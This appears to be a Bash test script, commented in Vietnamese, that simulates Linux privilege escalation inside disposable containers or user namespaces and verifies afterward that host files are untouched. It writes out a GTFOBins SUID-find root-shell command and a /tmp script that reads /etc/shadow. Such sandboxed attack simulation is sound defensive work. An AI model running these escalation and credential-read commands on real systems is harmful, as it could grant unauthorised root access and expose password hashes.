#!/usr/bin/env bash
# ==============================================================================
# tests/safe_attack_simulator.sh: Kịch bản giả lập tấn công leo thang đặc quyền AN TOÀN
# Tuân thủ nghiêm ngặt nguyên tắc Zero-Footprint:
#  - Chỉ chạy bên trong Container tạm thời (--rm) hoặc Linux Namespace cô lập (unshare)
#  - Tuyệt đối không thay đổi bất kỳ file/quyền nào trên máy Host Arch Linux
#  - Tự động dọn dẹp qua trap cleanup EXIT INT TERM
# ==============================================================================

set -euo pipefail

CONTAINER_NAME="privesc-safe-sim-$$"
TMP_DIR=$(mktemp -d /tmp/privesc-sim.XXXXXX)

# Lưu lại checksum và thuộc tính của các file nhạy cảm trên máy Host để kiểm chứng sau cùng
HOST_SHADOW_MD5=$(stat -c "%a %Y" /etc/shadow 2>/dev/null || echo "N/A")
HOST_PASSWD_MD5=$(stat -c "%a %Y" /etc/passwd 2>/dev/null || echo "N/A")

# ------------------------------------------------------------------------------
# HÀM CLEANUP TỰ ĐỘNG & ROLLBACK (Bắt buộc theo Safety Rule #2)
# ------------------------------------------------------------------------------
cleanup() {
    local exit_code=$?
    echo -e "\n\033[1;33m[!] Bắt đầu cơ chế Auto-Cleanup & Rollback trạng thái...\033[0m"

    # 1. Dừng và xóa container giả lập (nếu còn sót lại)
    if command -v docker >/dev/null 2>&1; then
        if docker ps -a -q -f name="${CONTAINER_NAME}" 2>/dev/null | grep -q .; then
            echo "[+] Dừng và xóa Docker container: ${CONTAINER_NAME}..."
            docker rm -f "${CONTAINER_NAME}" >/dev/null 2>&1 || true
        fi
    elif command -v podman >/dev/null 2>&1; then
        if podman ps -a -q -f name="${CONTAINER_NAME}" 2>/dev/null | grep -q .; then
            echo "[+] Dừng và xóa Podman container: ${CONTAINER_NAME}..."
            podman rm -f "${CONTAINER_NAME}" >/dev/null 2>&1 || true
        fi
    fi

    # 2. Xóa thư mục tạm
    if [[ -d "${TMP_DIR}" ]]; then
        rm -rf "${TMP_DIR}"
        echo "[+] Đã xóa thư mục tạm: ${TMP_DIR}"
    fi

    # 3. Healthcheck toàn vẹn máy Host Arch Linux
    echo -e "\n\033[1;36m=== HEALTHCHECK BẢO VỆ MÁY CHỦ ARCH LINUX ===\033[0m"
    local curr_shadow_md5 curr_passwd_md5
    curr_shadow_md5=$(stat -c "%a %Y" /etc/shadow 2>/dev/null || echo "N/A")
    curr_passwd_md5=$(stat -c "%a %Y" /etc/passwd 2>/dev/null || echo "N/A")

    if [[ "${HOST_SHADOW_MD5}" == "${curr_shadow_md5}" ]] && [[ "${HOST_PASSWD_MD5}" == "${curr_passwd_md5}" ]]; then
        echo -e "\033[1;32m[✓] BẢO VỆ TOÀN VẸN 100%: Hệ thống file Host (/etc/shadow, /etc/passwd) không hề bị thay đổi!\033[0m"
    else
        echo -e "\033[1;31m[X] CẢNH BÁO NGUY HIỂM: Phát hiện biến đổi trên máy Host!\033[0m"
    fi

    # Kiểm tra tồn dư container
    local lingering=0
    if command -v docker >/dev/null 2>&1; then
        lingering=$(docker ps -a -q -f name="${CONTAINER_NAME}" 2>/dev/null | wc -l || echo 0)
    elif command -v podman >/dev/null 2>&1; then
        lingering=$(podman ps -a -q -f name="${CONTAINER_NAME}" 2>/dev/null | wc -l || echo 0)
    fi

    if [[ "${lingering}" -eq 0 ]]; then
        echo -e "\033[1;32m[✓] DỌN DẸP HOÀN TẤT: Không có bất kỳ Container hay tệp tin rác nào tồn đọng.\033[0m"
    else
        echo -e "\033[1;31m[X] Còn sót lại ${lingering} container chưa xóa sạch!\033[0m"
    fi

    echo -e "\033[1;32m[✓] Hệ thống đã trở về đúng trạng thái ban đầu 100% (Zero-Footprint).\033[0m"
    exit "${exit_code}"
}

trap cleanup EXIT INT TERM

# ------------------------------------------------------------------------------
# LỰA CHỌN MÔI TRƯỜNG CÔ LẬP (DOCKER / PODMAN / UNSHARE USER NAMESPACE)
# ------------------------------------------------------------------------------
echo -e "\033[1;34m[*] Đang phát hiện môi trường container/cô lập an toàn...\033[0m"

RUNTIME=""
if command -v docker >/dev/null 2>&1 && docker info >/dev/null 2>&1; then
    RUNTIME="docker"
elif command -v podman >/dev/null 2>&1; then
    RUNTIME="podman"
elif command -v unshare >/dev/null 2>&1; then
    RUNTIME="unshare"
else
    echo -e "\033[1;31m[X] Không tìm thấy Docker, Podman hoặc unshare!\033[0m"
    exit 1
fi

echo -e "\033[1;32m[✓] Môi trường cô lập kích hoạt: ${RUNTIME}\033[0m"

# ------------------------------------------------------------------------------
# THỰC THI CÁC KỊCH BẢN TẤN CÔNG GIẢ LẬP
# ------------------------------------------------------------------------------
if [[ "${RUNTIME}" == "docker" || "${RUNTIME}" == "podman" ]]; then
    IMAGE="alpine:latest"
    echo -e "\n\033[1;35m>>> [KỊCH BẢN 1]: GTFOBins SUID Abuse (/usr/bin/find gán SUID để leo quyền trong container)\033[0m"
    ${RUNTIME} run --rm --name "${CONTAINER_NAME}" "${IMAGE}" /bin/sh -c '
        echo "[+] Đang chuẩn bị user không đặc quyền (attacker) bên trong container..."
        adduser -D attacker
        echo "[+] Giả lập cấp nhầm SUID cho /usr/bin/find BÊN TRONG CONTAINER..."
        chmod u+s /usr/bin/find
        echo "[+] Attacker kích hoạt khai thác find để spawn root shell..."
        su - attacker -c "/usr/bin/find . -exec /bin/sh -p -c \"id; whoami\" \; -quit"
    '

    echo -e "\n\033[1;35m>>> [KỊCH BẢN 2]: Thực thi mã khai thác từ /tmp và đọc trộm /etc/shadow trong container\033[0m"
    ${RUNTIME} run --rm --name "${CONTAINER_NAME}" "${IMAGE}" /bin/sh -c '
        echo "[+] Thả script payload giả lập vào /tmp/exploit.sh BÊN TRONG CONTAINER..."
        cat << "EOF" > /tmp/exploit.sh
#!/bin/sh
echo "[*] Exploit running with PID $$"
cat /etc/shadow >/dev/null 2>&1 || true
id
EOF
        chmod +x /tmp/exploit.sh
        /tmp/exploit.sh
        rm -f /tmp/exploit.sh
    '

    echo -e "\n\033[1;35m>>> [KỊCH BẢN 3]: Kiểm tra quyền hạn Linux Capabilities (CAP_SETUID) trong container\033[0m"
    ${RUNTIME} run --rm --name "${CONTAINER_NAME}" "${IMAGE}" /bin/sh -c '
        echo "[+] Kiểm tra trạng thái Capabilities bên trong container..."
        cat /proc/self/status | grep -i cap || true
    '

elif [[ "${RUNTIME}" == "unshare" ]]; then
    # Fallback an toàn tuyệt đối: Unprivileged User + PID + Mount Namespace
    echo -e "\033[1;33m[!] Sử dụng Linux User Namespace (unshare -r -m -p -f --mount-proc)...\033[0m"
    echo -e "\033[1;33m    Kernel coi tiến trình là root trong namespace riêng biệt, nhưng Host bảo toàn 100%!\033[0m"

    echo -e "\n\033[1;35m>>> [KỊCH BẢN 1]: SUID & Namespace Isolation Simulation\033[0m"
    unshare -r -m -p -f --mount-proc /bin/bash -c "
        echo '[+] Namespace PID: \$\$, Quyền hạn trong namespace: '
        id
        echo '[+] Thử nghiệm tạo file tạm trong thư mục sandbox ${TMP_DIR}...'
        cp /usr/bin/find \"${TMP_DIR}/myfind\" 2>/dev/null || true
        chmod u+s \"${TMP_DIR}/myfind\" 2>/dev/null || true
        ls -la \"${TMP_DIR}/myfind\" 2>/dev/null || true
    "

    echo -e "\n\033[1;35m>>> [KỊCH BẢN 2]: Thử nghiệm truy cập file nhạy cảm trong namespace cô lập\033[0m"
    unshare -r -m -p -f --mount-proc /bin/bash -c "
        echo '[+] Đọc file cấu hình trong namespace...'
        cat /etc/passwd | head -n 2
    "
fi

echo -e "\n\033[1;32m[✓] Toàn bộ kịch bản kiểm thử tấn công an toàn đã hoàn thành xuất sắc!\033[0m"
